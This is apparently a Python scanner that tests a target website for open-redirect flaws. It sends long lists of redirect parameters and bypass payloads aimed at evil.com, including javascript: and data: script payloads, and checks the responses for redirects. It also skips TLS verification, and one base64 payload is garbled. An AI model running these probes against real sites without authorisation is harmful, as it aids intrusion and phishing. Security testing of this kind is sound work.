"""Test for open redirect vulnerabilities — comprehensive payload, parameter, and bypass analysis."""

import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from typing import Optional
import time
import asyncio

BUDGET_SECONDS = 20


REDIRECT_PARAMS = [
    "url", "next", "redirect", "return", "dest", "goto", "redirect_uri",
    "continue", "target", "rurl", "dest_url", "next_url", "return_to",
    "checkout_url", "return_url", "goto_url", "hostname", "site", "link",
    "out", "view", "to", "path", "redir", "redirect_url", "redirect_uri",
    "next_uri", "return_uri", "to_url", "callback", "origin", "ref",
    "move", "go", "location", "exit", "exit_url", "after_redirect",
    "forward", "forward_to", "forward_url", "jump", "jump_to",
]

EXTERNAL_HOST = "evil.com"
EXTERNAL_URL = f"https://{EXTERNAL_HOST}"
EXTERNAL_PATH = f"//{EXTERNAL_HOST}"

PAYLOADS = [
    f"https://{EXTERNAL_HOST}",
    f"http://{EXTERNAL_HOST}",
    f"//{EXTERNAL_HOST}",
    f"/\\{EXTERNAL_HOST}",
    f"/\\/{EXTERNAL_HOST}",
    f"\\{EXTERNAL_HOST}",
    f"https:{EXTERNAL_HOST}",
    f"https:////{EXTERNAL_HOST}",
    f"////{EXTERNAL_HOST}",
    f"/{EXTERNAL_HOST}",
    f"///{EXTERNAL_HOST}",
    f"https://{EXTERNAL_HOST}/.",
    f"https://{EXTERNAL_HOST}/%0d%0a",
    f"https://{EXTERNAL_HOST}%0d%0a",
    f"https://{EXTERNAL_HOST}%0a",
    f"https://{EXTERNAL_HOST}%0d",
    f"https://{EXTERNAL_HOST}%09",
    f"https://{EXTERNAL_HOST}%00",
    f"https://{EXTERNAL_HOST}%08",
    f"https://{EXTERNAL_HOST}%0b",
    f"https://{EXTERNAL_HOST}%0c",
    f"https://{EXTERNAL_HOST}%0d",
    f"https://{EXTERNAL_HOST}%20",
    f"https://{EXTERNAL_HOST}%e2%80%80",
    f"https://{EXTERNAL_HOST}%c2%a0",
    f"https://{EXTERNAL_HOST}%09%09",
    f"https://{EXTERNAL_HOST}%0d%0d%0a%0a",
    f"javascript:alert(1)//https:{EXTERNAL_HOST}",
    f"javascript:window.location='https:{EXTERNAL_HOST}'",
    f"data:text/html,<script>location='https:{EXTERNAL_HOST}'</script>",
    f"ftp://{EXTERNAL_HOST}",
    f"file:///{EXTERNAL_HOST}",
    f"//{EXTERNAL_HOST}%252f%252f",
    f"javascript://%0aalert(1)//https:{EXTERNAL_HOST}",
    f"javascript:%0d%0aalert(1)//https:{EXTERNAL_HOST}",
    f"javascript:%0d%0d%0a%0aalert(1)//https:{EXTERNAL_HOST}",
    f"javascript:alert(1)//https:{EXTERNAL_HOST}",
    f"%2f%2f{EXTERNAL_HOST}",
    f"%5c%5c{EXTERNAL_HOST}",
    f"%5c{EXTERNAL_HOST}",
    f"///{EXTERNAL_HOST}%09",
    f"////{EXTERNAL_HOST}%0d%0a",
    f"https://{EXTERNAL_HOST}\\",
    f"https://{EXTERNAL_HOST}\\\\",
    f"https://{EXTERNAL_HOST}%5c",
    f"https://{EXTERNAL_HOST}%5c%5c",
    f"https://{EXTERNAL_HOST}?@",
    f"https://{EXTERNAL_HOST}#@",
    f"https://{EXTERNAL_HOST}%23",
    f"https://{EXTERNAL_HOST}%3f",
    f"https://www.{EXTERNAL_HOST}",
    f"https://evil%2ecom",
    f"https://evil%2Ecom",
    f"https://evil%00.com",
    f"https://evil%0d.com",
    f"https://evil%0a.com",
    f"https://evil%09.com",
    f"https://evil%ff.com",
    f"https://evil%C0%AF.com",
    f"https://evil%C0%AE.com",
    f"https://evil%C0%AE%C0%AF",
    f"javascript:alert(1)",
    f"data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly97EXTERNAL_HOSTfSc8L3NjcmlwdD4=",
    f"https://{EXTERNAL_HOST}%ef%bf%bd%ef%bf%bd",
    f"https://{EXTERNAL_HOST}%e2%80%90",
    f"https://{EXTERNAL_HOST}%e2%80%91",
    f"https://{EXTERNAL_HOST}%e2%80%92",
    f"https://{EXTERNAL_HOST}%e2%80%93",
    f"https://{EXTERNAL_HOST}%e2%80%94",
    f"https://{EXTERNAL_HOST}%e2%80%95",
    f"https://{EXTERNAL_HOST}%e2%80%98",
    f"https://{EXTERNAL_HOST}%e2%80%99",
    f"https://{EXTERNAL_HOST}%e2%80%9c",
    f"https://{EXTERNAL_HOST}%e2%80%9d",
    f"javascript:void(0)//https:{EXTERNAL_HOST}",
    f"https://{EXTERNAL_HOST}%1a",
    f"https://{EXTERNAL_HOST}%1b",
    f"https://{EXTERNAL_HOST}%7f",
    f"https://{EXTERNAL_HOST}%80",
    f"https://{EXTERNAL_HOST}%ff%fe",
    f"https://{EXTERNAL_HOST}/",
    f"https://{EXTERNAL_HOST}/./",
    f"https://{EXTERNAL_HOST}/..;/",
    f"https://{EXTERNAL_HOST}/..%00/",
    f"https://{EXTERNAL_HOST}%252f",
    f"https://{EXTERNAL_HOST}%c0%af",
    f"https://{EXTERNAL_HOST}%c1%9c",
    f"///{EXTERNAL_HOST}/",
    f"\\\\{EXTERNAL_HOST}",
    f"\\\\\\{EXTERNAL_HOST}",
]


def _build_url_with_param(base: str, param: str, payload: str) -> str:
    parsed = urlparse(base)
    query = parse_qs(parsed.query, keep_blank_values=True)
    query[param] = [payload]
    new_query = urlencode({k: v[0] if len(v) == 1 else v for k, v in query.items()})
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


async def open_redirect(target: str) -> dict:
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    deadline = time.monotonic() + BUDGET_SECONDS
    budget_exhausted = False
    _left = lambda: max(0.05, deadline - time.monotonic())

    results = []
    risk = "info"
    confidence = "high"
    evidence_items = []
    redirect_chains = []

    async with httpx.AsyncClient(
        timeout=10.0,
        follow_redirects=False,
        verify=False,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    ) as client:
        for param in REDIRECT_PARAMS:
            if time.monotonic() >= deadline:
                budget_exhausted = True
                break
            for payload in PAYLOADS:
                if time.monotonic() >= deadline:
                    budget_exhausted = True
                    break
                try:
                    url = _build_url_with_param(target, param, payload)
                    resp = await asyncio.wait_for(client.get(url), timeout=_left())
                    loc = resp.headers.get("location", "")

                    if loc and (EXTERNAL_HOST in loc or "evil" in loc.lower()):
                        chain = [loc]
                        try:
                            current = loc
                            for _ in range(5):
                                if current.startswith("http"):
                                    r2 = await asyncio.wait_for(client.get(current, follow_redirects=False), timeout=_left())
                                    next_loc = r2.headers.get("location", "")
                                    if next_loc:
                                        chain.append(next_loc)
                                        current = next_loc
                                    else:
                                        break
                                else:
                                    break
                        except Exception:
                            pass

                        is_external = any(
                            EXTERNAL_HOST in hop for hop in chain
                        ) or EXTERNAL_HOST in loc

                        if is_external:
                            severity = "CRITICAL"
                            risk = "critical"
                        else:
                            severity = "MEDIUM"
                            risk = max_risk(risk, "medium")

                        results.append({
                            "parameter": param,
                            "payload": payload,
                            "redirect_to": loc,
                            "chain": chain,
                            "is_external": is_external,
                            "severity": severity,
                            "vulnerable": True,
                        })
                        evidence_items.append(
                            f"param={param} payload={payload[:60]} → {loc[:120]}"
                        )
                        redirect_chains.append({"param": param, "chain": chain})
                        break

                except (httpx.HTTPError, asyncio.TimeoutError):
                    continue

        for param in REDIRECT_PARAMS[:20]:
            if time.monotonic() >= deadline:
                budget_exhausted = True
                break
            for payload in PAYLOADS[:20]:
                if time.monotonic() >= deadline:
                    budget_exhausted = True
                    break
                try:
                    url = _build_url_with_param(target, param, payload)
                    resp = await asyncio.wait_for(client.post(
                        url,
                        data={param: payload},
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    ), timeout=_left())
                    loc = resp.headers.get("location", "")

                    if loc and (EXTERNAL_HOST in loc or "evil" in loc.lower()):
                        is_external = EXTERNAL_HOST in loc
                        severity = "CRITICAL" if is_external else "MEDIUM"
                        if is_external:
                            risk = "critical"

                        results.append({
                            "test_type": "post",
                            "parameter": param,
                            "payload": payload,
                            "redirect_to": loc,
                            "is_external": is_external,
                            "severity": severity,
                            "vulnerable": True,
                        })
                        evidence_items.append(
                            f"POST param={param} → {loc[:120]}"
                        )
                        break

                except (httpx.HTTPError, asyncio.TimeoutError):
                    continue

        for param in REDIRECT_PARAMS[:15]:
            if time.monotonic() >= deadline:
                budget_exhausted = True
                break
            for payload in [f"https://{EXTERNAL_HOST}", f"//{EXTERNAL_HOST}", f"/\\{EXTERNAL_HOST}"]:
                if time.monotonic() >= deadline:
                    budget_exhausted = True
                    break
                try:
                    url = _build_url_with_param(target, param, payload)
                    resp = await asyncio.wait_for(client.get(url), timeout=_left())
                    loc = resp.headers.get("location", "")
                    body = resp.text[:5000]

                    js_patterns = [
                        f"window.location='{EXTERNAL_HOST}'",
                        f"window.location=\"{EXTERNAL_HOST}\"",
                        f"window.location.href='{EXTERNAL_HOST}'",
                        f"window.location.replace('{EXTERNAL_HOST}')",
                        f"document.location='{EXTERNAL_HOST}'",
                        f"document.location=\"{EXTERNAL_HOST}\"",
                        f"document.location.href='{EXTERNAL_HOST}'",
                        f"document.location.replace('{EXTERNAL_HOST}')",
                        f"window.open('{EXTERNAL_HOST}'",
                        f"setTimeout(function(){{window.location='{EXTERNAL_HOST}'",
                        f"window.location.assign('{EXTERNAL_HOST}'",
                    ]

                    for pattern in js_patterns:
                        if pattern.lower() in body.lower():
                            results.append({
                                "test_type": "dom_redirect",
                                "parameter": param,
                                "payload": payload,
                                "javascript_redirect": pattern,
                                "severity": "HIGH",
                                "vulnerable": True,
                            })
                            risk = max_risk(risk, "high")
                            evidence_items.append(
                                f"DOM redirect: {pattern[:80]}"
                            )
                            break

                except (httpx.HTTPError, asyncio.TimeoutError):
                    continue

        for param in REDIRECT_PARAMS[:10]:
            if time.monotonic() >= deadline:
                budget_exhausted = True
                break
            payloads_special = [
                f"https://{EXTERNAL_HOST}%2f%2f",
                f"//{EXTERNAL_HOST}%2f%2f",
                f"https://{EXTERNAL_HOST}\\\\evil.com",
                f"//{EXTERNAL_HOST}\\\\evil.com",
                f"//{EXTERNAL_HOST}%00",
                f"//{EXTERNAL_HOST}%0d",
                f"//{EXTERNAL_HOST}%0a",
                f"//{EXTERNAL_HOST}%09",
                f"//{EXTERNAL_HOST}@",
                f"//{EXTERNAL_HOST}#@",
                f"//{EXTERNAL_HOST}?",
                f"//{EXTERNAL_HOST}\\",
                f"//{EXTERNAL_HOST}\\\\",
                f"https:{EXTERNAL_HOST}",
                f"javascript://{EXTERNAL_HOST}",
                f"ftp://{EXTERNAL_HOST}",
                f"file://{EXTERNAL_HOST}",
            ]
            for payload in payloads_special:
                if time.monotonic() >= deadline:
                    budget_exhausted = True
                    break
                try:
                    url = _build_url_with_param(target, param, payload)
                    resp = await asyncio.wait_for(client.get(url), timeout=_left())
                    loc = resp.headers.get("location", "")

                    if loc and (EXTERNAL_HOST in loc or "evil" in loc.lower()):
                        is_external = EXTERNAL_HOST in loc
                        severity = "CRITICAL" if is_external else "MEDIUM"
                        if is_external:
                            risk = "critical"

                        results.append({
                            "test_type": "filter_bypass",
                            "parameter": param,
                            "payload": payload,
                            "redirect_to": loc,
                            "is_external": is_external,
                            "severity": severity,
                            "vulnerable": True,
                        })
                        evidence_items.append(
                            f"Filter bypass param={param} payload={payload[:60]} → {loc[:120]}"
                        )
                        break

                except (httpx.HTTPError, asyncio.TimeoutError):
                    continue

        try:
            resp = await asyncio.wait_for(client.get(target), timeout=_left())
            body = resp.text[:10000]
            meta_refresh_patterns = [
                f"url={EXTERNAL_HOST}",
                f"url=https://{EXTERNAL_HOST}",
                f"url=//{EXTERNAL_HOST}",
                f"url=/\\{EXTERNAL_HOST}",
            ]
            for pattern in meta_refresh_patterns:
                if pattern.lower() in body.lower():
                    results.append({
                        "test_type": "meta_refresh",
                        "pattern": pattern,
                        "severity": "HIGH",
                        "vulnerable": True,
                    })
                    risk = max_risk(risk, "high")
                    evidence_items.append(f"Meta refresh redirect: {pattern}")
                    break
        except (httpx.HTTPError, asyncio.TimeoutError):
            pass

    unique_vulns = [r for r in results if r.get("vulnerable")]
    total_tests = len([r for r in results if "error" not in r])

    return {
        "target": target,
        "total_tests": total_tests,
        "vulnerable_count": len(unique_vulns),
        "vulnerable": len(unique_vulns) > 0,
        "risk": risk,
        "confidence": confidence,
        "technique": "Open redirect — parameter pollution, filter bypass, DOM/JS redirect",
        "evidence": evidence_items[:20],
        "redirect_chains": redirect_chains[:10],
        "budget_seconds": BUDGET_SECONDS,
        "budget_exhausted": budget_exhausted,
        "findings": unique_vulns[:50],
    }


def max_risk(current: str, proposed: str) -> str:
    hierarchy = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    return proposed if hierarchy.get(proposed, 0) > hierarchy.get(current, 0) else current
